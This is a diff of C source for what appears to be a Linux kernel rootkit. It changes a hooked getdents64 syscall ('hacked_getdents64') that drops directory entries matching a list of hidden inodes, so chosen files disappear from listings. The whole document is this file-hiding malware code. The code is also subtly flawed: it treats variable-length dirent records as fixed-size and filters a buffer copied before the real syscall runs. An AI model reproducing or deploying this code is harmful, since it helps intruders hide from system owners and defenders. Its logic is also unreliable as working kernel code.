@@ -141,45 +141,42 @@ getdents64_ptr orig_getdents64;
 asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                                  unsigned int count)
 {
-	int actual_result, i;
+	int actual_result, number_dirps, i;
 	struct hidden_file *ptr;
-	struct linux_dirent64 toWorkWith;
-	struct linux_dirent64 *forUser;
+	struct linux_dirent64 *kdirp;
 
 	printk(KERN_INFO "Running hacked_getdents64\n");
 
-	// check user space access and allocate kernel space linux_dirent
+	// copy from user to kernelspace;
 	if (!access_ok(VERIFY_READ,dirp,count))
 		return -1;
-	if ((forUser = kmalloc(count,GFP_KERNEL)) == NULL)
+	if ((kdirp = kmalloc(count,GFP_KERNEL)) == NULL)
+		return -1;
+	if (copy_from_user(kdirp,dirp,count))
 		return -1;
 
 	// run real getdents64 and check result for files to hide
 	actual_result = (*orig_getdents64)(fd,dirp,count);
 	if (actual_result > 0) { // actually read some bytes
 		printk(KERN_INFO "Checking dirp\n");
-		for (i = 0; i < actual_result / sizeof(struct linux_dirent64); i++) {
-			if (copy_from_user(&toWorkWith,dirp + i,sizeof(struct linux_dirent64)))
-				return -1;
+		number_dirps = actual_result / sizeof(struct linux_dirent64);
+		for (i = 0; i < number_dirps; i++) {
 			list_for_each_entry(ptr,&hidden_files,list) {
-				if (toWorkWith.d_ino == ptr->inode) {
+				if ((kdirp + i)->d_ino == ptr->inode) {
 					printk(KERN_INFO "Found file to hide\n");
-					continue;
+					memcpy(kdirp + i,kdirp + i + 1,
+					       sizeof(struct linux_dirent64)*(number_dirps-i-1));
 				}
 			}
-			*forUser++ = toWorkWith;
 		}
 	}
-	else {
-		return actual_result;
-	}
 
-	// copy linux_dirent * to user space
+	// copy from kernel to userspace
 	if (!access_ok(VERIFY_WRITE,dirp,count))
 		return -1;
-	if (copy_to_user(dirp,forUser,count))
+	if (copy_to_user(dirp,kdirp,count))
 		return -1;
-	kfree(forUser);
+	kfree(kdirp);
 
 	// return actual result
 	return actual_result;
